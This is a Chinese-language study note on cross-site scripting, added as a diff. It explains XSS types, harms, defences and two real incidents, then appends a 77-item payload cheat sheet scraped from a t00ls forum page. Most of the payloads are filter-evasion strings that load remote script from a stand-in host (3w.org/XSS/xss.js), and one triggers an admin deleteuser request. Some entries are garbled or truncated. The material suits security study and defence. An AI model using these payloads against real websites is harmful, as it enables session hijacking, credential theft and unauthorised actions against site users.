@@ -1,0 +1,300 @@
+﻿一，概念：
+	XSS攻击全称跨站脚本攻击，是为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS，
+	恶意攻击者往web页面里插入恶意script代码，当用户浏览改页面时，嵌入在里面的script代码会被执行，从而达到恶意攻击用户的目的。
+
+	跨站脚本攻击的核心在于脚本的成功注入，并二次展示，通常服务器端都会对文本内容进行安全性的过滤。
+	xss是一门又热门又不太受重视的Web攻击手法，为什么会这样呢，原因有下：
+					耗时间、有一定几率不成功、没有相应的软件来完成自动化攻击、是一种被动的攻击手法等。
+	但是这些并没有影响黑客对此漏洞的偏爱，原因只有一个：
+			Xss几乎每个网站都存在，google、baidu、360等都存在。
+	
+二，XSS攻击的危害包括：
+	1、盗取各类用户帐号：如机器登录帐号、用户网银帐号、各类管理员帐号
+	2、控制企业数据：包括读取、篡改、添加、删除企业敏感数据的能力
+	3、盗窃企业重要的具有商业价值的资料
+	4、非法转账
+	5、强制发送电子邮件
+	6、网站挂马
+	7、控制受害者机器向其它网站发起攻击
+
+	网站挂马：网页挂马指的是把一个木马程序上传到一个网站里面然后用木马生成器生一个网马，再上到空间里面！再加代码使得木马在打开网页时运行！
+
+
+三，分类：
+	其重点是“跨域”和“客户端执行”。有人将XSS攻击分为三种，分别是：
+							1. Reflected XSS（基于反射的XSS攻击）
+							2. Stored XSS（基于存储的XSS攻击）
+							3. DOM-based or local XSS（基于DOM或本地的XSS攻击）
+	
+	
+	1.Reflected XSS（基于反射的XSS攻击）
+		基于反射的XSS攻击，主要依靠站点服务端返回脚本，在客户端触发执行从而发起Web攻击。
+		也就是Web客户端使用Server端脚本生成页面为用户提供数据时，如果未经验证的用户数据被包含在页面中而未经HTML实体编码，
+		客户端代码便能够注入到动态页面中。其攻击过程如下：
+				Alice经常浏览某个网站，此网站为Bob所拥有。Bob的站点运行Alice使用用户名/密码进行登录，并存储敏感信息(比如银行帐户信息)。
+				Charly发现Bob的站点包含反射性的XSS漏洞。
+				Charly编写一个利用漏洞的URL，并将其冒充为来自Bob的邮件发送给Alice。
+				Alice在登录到Bob的站点后，浏览Charly提供的URL。
+				嵌入到URL中的恶意脚本在Alice的浏览器中执行，就像它直接来自Bob的服务器一样。此脚本盗窃敏感信息(授权、信用卡、帐号信息等)
+				然后在Alice完全不知情的情况下将这些信息发送到Charly的Web站点。
+	
+	2. Stored XSS（基于存储的XSS攻击）
+		基于存储的XSS攻击，是通过发表带有恶意跨域脚本的帖子/文章，从而把恶意脚本存储在服务器，每个访问该帖子/文章的人就会触发执行。
+		该类型是应用最为广泛而且有可能影响到Web服务器自身安全的漏洞，骇客将攻击脚本上传到Web服务器上，
+		使得所有访问该页面的用户都面临信息泄漏的可能，其中也包括了Web服务器的管理员。其攻击过程如下：
+						Bob拥有一个Web站点，该站点允许用户发布信息/浏览已发布的信息。
+						Charly注意到Bob的站点具有该类型的XSS漏洞。
+						Charly发布一个热点信息，吸引其它用户纷纷阅读。
+						Bob或者是任何的其他人如Alice浏览该信息，其会话cookies或者其它信息将被Charly盗走。
+	
+	
+	3. DOM-based or local XSS（基于DOM或本地的XSS攻击）
+		基于DOM或本地的XSS攻击。一般是提供一个免费的wifi，但是提供免费wifi的网关会往你访问的任何页面插入一段脚本或者是直接返回一个钓鱼页面，
+		从而植入恶意脚本。
+		这种直接存在于页面，无须经过服务器返回就是基于本地的XSS攻击。
+		这种漏洞存在于页面中客户端脚本自身。其攻击过程如下所示：
+					Alice给Bob发送一个恶意构造了Web的URL。
+					Bob点击并查看了这个URL。
+					恶意页面中的JavaScript打开一个具有漏洞的HTML页面并将其安装在Bob电脑上。
+					具有漏洞的HTML页面包含了在Bob电脑本地域执行的JavaScript。
+					Alice的恶意脚本可以在Bob的电脑上执行Bob所持有的权限下的命令。
+	
+	综上三种：
+			类型3直接威胁用户个体，而类型1和类型2所威胁的对象都是企业级Web应用。
+	
+四，传统防御技术：
+		1，基于特征的防御：
+			XSS漏洞和著名的SQL注入漏洞一样，都是利用了Web页面的编写不完善，所以每一个漏洞所利用和针对的弱点都不尽相同。
+			这就给XSS漏洞防御带来了困难：不可能以单一特征来概括所有XSS攻击。
+			传统XSS防御多采用特征匹配方式，在所有提交的信息中都进行匹配检查。
+			对于这种类型的XSS攻击，采用的模式匹配方法一般会需要对“javascript”这个关键字进行检索，一旦发现提交信息中包含“javascript”，就认定为XSS攻击。
+			这种检测方法的缺陷显而易见：骇客可以通过以下插入字符或完全编码的方式躲避检测：
+					躲避方法1)在javascript中加入多个tab键，得到
+							< IMG SRC="jav	ascript:alert('XSS');" >;
+					躲避方法2) 在javascript中加入(空格)字符，得到
+							< IMG SRC="javascri pt:alert('XSS');" >;
+					躲避方法3) 在javascript中加入(回车)字符，得到
+							< IMG SRC="jav
+							ascript:alert('XSS');" >;
+					躲避方法4)在javascript中的每个字符间加入回车换行符，得到
+							< IMG SRC="javascrip\r
+							\nt:alert('XSS');" >
+					躲避方法5)对"javascript:alert('XSS')"采用完全编码，得到
+							< IMGSRC=javascrip?74:alert('XSS') >	
+	
+		2， 基于代码修改的防御：
+			和SQL注入防御一样，XSS攻击也是利用了Web页面的编写疏忽，所以还有一种方法就是从Web应用开发的角度来避免：
+			步骤1、对所有用户提交内容进行可靠的输入验证，包括对URL、查询关键字、HTTP头、POST数据等，
+				   仅接受指定长度范围内、采用适当格式、采用所预期的字符的内容提交，对其他的一律过滤。
+			步骤2、实现Session标记(session tokens)、CAPTCHA(验证码)系统或者HTTP引用头检查，以防功能被第三方网站所执行。
+			步骤3、确认接收的的内容被妥善的规范化，仅包含最小的、安全的Tag(标签)(没有javascript)，
+				  去掉任何对远程内容的引用(尤其是样式表和javascript)，使用HTTP only的cookie。
+			当然，如上操作将会降低Web业务系统的可用性，用户仅能输入少量的制定字符，人与系统间的交互被降到极致，仅适用于信息发布型站点。
+			并且考虑到很少有Web编码人员受过正规的安全培训，很难做到完全避免页面中的XSS漏洞。
+				
+	
+       注入漏洞：	
+		注入漏洞是因为字符过滤不严谨所造成的，可以得到管理员的账号密码等相关资料。
+		这个漏洞是现在应用最广泛，杀伤力也很大的漏洞，可以说微软的官方网站也存在着注入漏洞。
+		
+		
+五，受攻击事件：
+		1，新浪微博XSS受攻击事件：
+			2011年6月28日晚，新浪微博出现了一次比较大的XSS攻击事件。大量用户自动发送诸如：“郭美美事件的一些未注意到的细节”，“建党大业中穿帮的地方”，
+			“让女人心动的100句诗歌”，“3D肉团团高清普通话版种子”，“这是传说中的神仙眷侣啊”，“惊爆!范冰冰艳照真流出了”等等微博和私信，
+			并自动关注一位名为hellosamy的用户。
+			事件的经过线索如下：
+				20:14，开始有大量带V的认证用户中招转发蠕虫
+				20:30，某网站中的病毒页面无法访问
+				20:32，新浪微博中hellosamy用户无法访问
+				21:02，新浪漏洞修补完毕
+				
+		    蠕虫（Worm）：是计算机网络病毒的一种，因其传播形式类似蠕虫一般，无孔不入。
+		    
+		2，百度贴吧xss攻击事件：
+			2014年3月9晚，六安吧等几十个贴吧出现点击推广贴会自动转发等。并且吧友所关注的贴吧都会转一遍，病毒循环发帖。并且导致吧务人员，和吧友被封禁。
+				
+				
+				
+_______________________________________附常见的XSS攻击方法___________________________________________
+
+(1)普通的XSS JavaScript注入
+<SCRIPT SRC=http://3w.org/XSS/xss.js></SCRIPT>
+(2)IMG标签XSS使用JavaScript命令
+<SCRIPT SRC=http://3w.org/XSS/xss.js></SCRIPT>
+(3)IMG标签无分号无引号
+<IMG SRC=javascript:alert(‘XSS’)>
+(4)IMG标签大小写不敏感
+<IMG SRC=JaVaScRiPt:alert(‘XSS’)>
+(5)HTML编码(必须有分号)
+<IMG SRC=javascript:alert(“XSS”)>
+(6)修正缺陷IMG标签
+<IMG “”"><SCRIPT>alert(“XSS”)</SCRIPT>”>
+(7)formCharCode标签(计算器)
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+(8)UTF-8的Unicode编码(计算器)
+<IMG SRC=jav..省略..S')>
+(9)7位的UTF-8的Unicode编码是没有分号的(计算器)
+<IMG SRC=jav..省略..S')>
+(10)十六进制编码也是没有分号(计算器)
+<IMG SRC=&#x6A&#x61&#x76&#x61..省略..&#x58&#x53&#x53&#x27&#x29>
+(11)嵌入式标签,将Javascript分开
+<IMG SRC=”jav ascript:alert(‘XSS’);”>
+(12)嵌入式编码标签,将Javascript分开
+<IMG SRC=”jav ascript:alert(‘XSS’);”>
+(13)嵌入式换行符
+<IMG SRC=”jav ascript:alert(‘XSS’);”>
+(14)嵌入式回车
+<IMG SRC=”jav ascript:alert(‘XSS’);”>
+(15)嵌入式多行注入JavaScript,这是XSS极端的例子
+<IMG SRC=”javascript:alert(‘XSS‘)”>
+(16)解决限制字符(要求同页面)
+<script>z=’document.’</script>
+<script>z=z+’write(“‘</script>
+<script>z=z+’<script’</script>
+<script>z=z+’ src=ht’</script>
+<script>z=z+’tp://ww’</script>
+<script>z=z+’w.shell’</script>
+<script>z=z+’.net/1.’</script>
+<script>z=z+’js></sc’</script>
+<script>z=z+’ript>”)’</script>
+<script>eval_r(z)</script>
+(17)空字符12-7-1 T00LS - Powered by Discuz! Board
+https://www.t00ls.net/viewthread.php?action=printable&tid=15267 2/6
+perl -e ‘print “<IMG SRC=java\0script:alert(\”XSS\”)>”;’ > out
+(18)空字符2,空字符在国内基本没效果.因为没有地方可以利用
+perl -e ‘print “<SCR\0IPT>alert(\”XSS\”)</SCR\0IPT>”;’ > out
+(19)Spaces和meta前的IMG标签
+<IMG SRC=” javascript:alert(‘XSS’);”>
+(20)Non-alpha-non-digit XSS
+<SCRIPT/XSS SRC=”http://3w.org/XSS/xss.js”></SCRIPT>
+(21)Non-alpha-non-digit XSS to 2
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(“XSS”)>
+(22)Non-alpha-non-digit XSS to 3
+<SCRIPT/SRC=”http://3w.org/XSS/xss.js”></SCRIPT>
+(23)双开括号
+<<SCRIPT>alert(“XSS”);//<</SCRIPT>
+(24)无结束脚本标记(仅火狐等浏览器)
+<SCRIPT SRC=http://3w.org/XSS/xss.js?<B>
+(25)无结束脚本标记2
+<SCRIPT SRC=//3w.org/XSS/xss.js>
+(26)半开的HTML/JavaScript XSS
+<IMG SRC=”javascript:alert(‘XSS’)”
+(27)双开角括号
+<iframe src=http://3w.org/XSS.html <
+(28)无单引号 双引号 分号
+<SCRIPT>a=/XSS/
+alert(a.source)</SCRIPT>
+(29)换码过滤的JavaScript
+\”;alert(‘XSS’);//
+(30)结束Title标签
+</TITLE><SCRIPT>alert(“XSS”);</SCRIPT>
+(31)Input Image
+<INPUT SRC=”javascript:alert(‘XSS’);”>
+(32)BODY Image
+<BODY BACKGROUND=”javascript:alert(‘XSS’)”>
+(33)BODY标签
+<BODY(‘XSS’)>
+(34)IMG Dynsrc
+<IMG DYNSRC=”javascript:alert(‘XSS’)”>
+(35)IMG Lowsrc
+<IMG LOWSRC=”javascript:alert(‘XSS’)”>
+(36)BGSOUND
+<BGSOUND SRC=”javascript:alert(‘XSS’);”>
+(37)STYLE sheet
+<LINK REL=”stylesheet” HREF=”javascript:alert(‘XSS’);”>
+(38)远程样式表
+<LINK REL=”stylesheet” HREF=”http://3w.org/xss.css”>
+(39)List-style-image(列表式)
+<STYLE>li {list-style-image: url(“javascript:alert(‘XSS’)”);}</STYLE><UL><LI>XSS
+(40)IMG VBscript
+<IMG SRC=’vbscript:msgbox(“XSS”)’></STYLE><UL><LI>XSS
+(41)META链接url
+<META HTTP-EQUIV=”refresh” CONTENT=”0;
+URL=http://;URL=javascript:alert(‘XSS’);”>
+(42)Iframe
+<IFRAME SRC=”javascript:alert(‘XSS’);”></IFRAME>
+(43)Frame
+<FRAMESET><FRAME SRC=”javascript:alert(‘XSS’);”></FRAMESET>12-7-1 T00LS - Powered by Discuz! Board
+https://www.t00ls.net/viewthread.php?action=printable&tid=15267 3/6
+(44)Table
+<TABLE BACKGROUND=”javascript:alert(‘XSS’)”>
+(45)TD
+<TABLE><TD BACKGROUND=”javascript:alert(‘XSS’)”>
+(46)DIV background-image
+<DIV STYLE=”background-image: url(javascript:alert(‘XSS’))”>
+(47)DIV background-image后加上额外字符(1-32&34&39&160&8192-
+8&13&12288&65279)
+<DIV STYLE=”background-image: url(javascript:alert(‘XSS’))”>
+(48)DIV expression
+<DIV STYLE=”width: expression_r(alert(‘XSS’));”>
+(49)STYLE属性分拆表达
+<IMG STYLE=”xss:expression_r(alert(‘XSS’))”>
+(50)匿名STYLE(组成:开角号和一个字母开头)
+<XSS STYLE=”xss:expression_r(alert(‘XSS’))”>
+(51)STYLE background-image
+<STYLE>.XSS{background-image:url(“javascript:alert(‘XSS’)”);}</STYLE><A
+CLASS=XSS></A>
+(52)IMG STYLE方式
+exppression(alert(“XSS”))’>
+(53)STYLE background
+<STYLE><STYLE
+type=”text/css”>BODY{background:url(“javascript:alert(‘XSS’)”)}</STYLE>
+(54)BASE
+<BASE HREF=”javascript:alert(‘XSS’);//”>
+(55)EMBED标签,你可以嵌入FLASH,其中包涵XSS
+<EMBED SRC=”http://3w.org/XSS/xss.swf” ></EMBED>
+(56)在flash中使用ActionScrpt可以混进你XSS的代码
+a=”get”;
+b=”URL(\”";
+c=”javascript:”;
+d=”alert(‘XSS’);\”)”;
+eval_r(a+b+c+d);
+(57)XML namespace.HTC文件必须和你的XSS载体在一台服务器上
+<HTML xmlns:xss>
+<?import namespace=”xss” implementation=”http://3w.org/XSS/xss.htc”>
+<xss:xss>XSS</xss:xss>
+</HTML>
+(58)如果过滤了你的JS你可以在图片里添加JS代码来利用
+<SCRIPT SRC=””></SCRIPT>
+(59)IMG嵌入式命令,可执行任意命令
+<IMG SRC=”http://www.XXX.com/a.php?a=b”>
+(60)IMG嵌入式命令(a.jpg在同服务器)
+Redirect 302 /a.jpg http://www.XXX.com/admin.asp&deleteuser
+(61)绕符号过滤
+<SCRIPT a=”>” SRC=”http://3w.org/xss.js”></SCRIPT>
+(62)
+<SCRIPT =”>” SRC=”http://3w.org/xss.js”></SCRIPT>
+(63)
+<SCRIPT a=”>” ” SRC=”http://3w.org/xss.js”></SCRIPT>
+(64)
+<SCRIPT “a=’>’” SRC=”http://3w.org/xss.js”></SCRIPT>
+(65)
+<SCRIPT a=`>` SRC=”http://3w.org/xss.js”></SCRIPT>
+(66)12-7-1 T00LS - Powered by Discuz! Board
+https://www.t00ls.net/viewthread.php?action=printable&tid=15267 4/6
+<SCRIPT a=”>’>” SRC=”http://3w.org/xss.js”></SCRIPT>
+(67)
+<SCRIPT>document.write(“<SCRI”);</SCRIPT>PT SRC=”http://3w.org/xss.js”>
+</SCRIPT>
+(68)URL绕行
+<A HREF=”http://127.0.0.1/”>XSS</A>
+(69)URL编码
+<A HREF=”http://3w.org”>XSS</A>
+(70)IP十进制
+<A HREF=”http://3232235521″>XSS</A>
+(71)IP十六进制
+<A HREF=”http://0xc0.0xa8.0×00.0×01″>XSS</A>
+(72)IP八进制
+<A HREF=”http://0300.0250.0000.0001″>XSS</A>
+(73)混合编码
+<A HREF=”h
+tt p://6 6.000146.0×7.147/”">XSS</A>
+(74)节省[http:]
+<A HREF=”//www.google.com/”>XSS</A>
+(75)节省[www]
+<A HREF=”http://google.com/”>XSS</A>
+(76)绝对点绝对DNS
+<A HREF=”http://www.google.com./”>XSS</A>
+(77)javascript链接
+<A HREF=”javascript:document.location=’http://www.google.com/’”>XSS</A>
